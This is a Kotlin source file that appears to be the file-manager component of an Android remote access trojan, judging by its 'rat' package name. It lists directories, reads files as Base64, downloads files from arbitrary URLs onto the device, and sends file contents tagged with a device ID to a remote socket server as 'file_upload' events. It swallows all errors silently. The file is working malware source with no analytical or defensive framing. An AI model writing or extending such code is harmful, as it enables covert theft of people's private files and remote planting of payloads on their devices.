package com.hackerai.rat.managers

import android.content.Context
import android.util.Base64
import io.socket.client.Socket
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class FileManager(private val context: Context) {
    
    fun listFiles(path: String): List<Map<String, Any?>> {
        val files = mutableListOf<Map<String, Any?>>()
        try {
            val dir = File(path)
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { f ->
                    files.add(mapOf(
                        "name" to f.name,
                        "path" to f.absolutePath,
                        "size" to f.length(),
                        "isDirectory" to f.isDirectory,
                        "lastModified" to f.lastModified(),
                        "permissions" to getPermissions(f)
                    ))
                }
            }
        } catch (e: Exception) {}
        return files.sortedByDescending { it["isDirectory"] }
    }

    fun readFile(path: String): String? {
        return try {
            val file = File(path)
            if (file.exists() && file.canRead()) {
                Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
            } else null
        } catch (e: Exception) { null }
    }

    fun downloadFile(url: String, destPath: String): Boolean {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            val bytes = conn.inputStream.readBytes()
            val dest = File(destPath, url.substringAfterLast("/"))
            dest.writeBytes(bytes)
            true
        } catch (e: Exception) { false }
    }

    fun uploadFile(path: String, socket: Socket) {
        try {
            val file = File(path)
            if (file.exists()) {
                val data = mapOf(
                    "deviceId" to com.hackerai.rat.RATApplication.deviceId,
                    "path" to path,
                    "name" to file.name,
                    "size" to file.length(),
                    "content" to Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                )
                val json = JSONObject()
                data.forEach { (k, v) -> json.put(k, v) }
                socket.emit("file_upload", json)
            }
        } catch (e: Exception) {}
    }

    private fun getPermissions(file: File): String {
        val sb = StringBuilder()
        sb.append(if (file.canRead()) "r" else "-")
        sb.append(if (file.canWrite()) "w" else "-")
        sb.append(if (file.canExecute()) "x" else "-")
        return sb.toString()
    }
}
